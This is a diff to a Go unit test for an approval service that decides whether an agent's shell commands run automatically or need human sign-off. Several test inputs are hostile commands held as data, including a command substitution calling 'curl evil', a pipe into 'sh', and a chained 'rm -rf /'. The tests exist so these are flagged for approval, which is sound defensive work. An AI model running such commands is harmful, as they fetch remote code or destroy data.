@@ -58,6 +58,13 @@ func TestUnit_Evaluate_CommandPrefixAllowlist_MatchesTheOpeningTokens(t *testing
 		{map[string]any{"command": "go test > out.txt"}, hitlservice.ActionApprove},
 		{map[string]any{"command": "go test $(curl evil)"}, hitlservice.ActionApprove},
 		{map[string]any{"command": "go test | sh"}, hitlservice.ActionApprove},
+		{map[string]any{"command": "ls -la | ls"}, hitlservice.ActionAllow},
+		{map[string]any{"command": "go test ./... | ls -1"}, hitlservice.ActionAllow},
+		{map[string]any{"command": "ls | cat"}, hitlservice.ActionApprove},
+		{map[string]any{"command": "ls || ls"}, hitlservice.ActionApprove},
+		{map[string]any{"command": "ls |"}, hitlservice.ActionApprove},
+		{map[string]any{"command": "ls | ls > out.txt"}, hitlservice.ActionApprove},
+		{map[string]any{"command": "ls | ls; rm -rf /"}, hitlservice.ActionApprove},
 	}
 	for _, tc := range cases {
 		got, err := svc.Evaluate(context.Background(), "local_shell", "local_shell", tc.args)
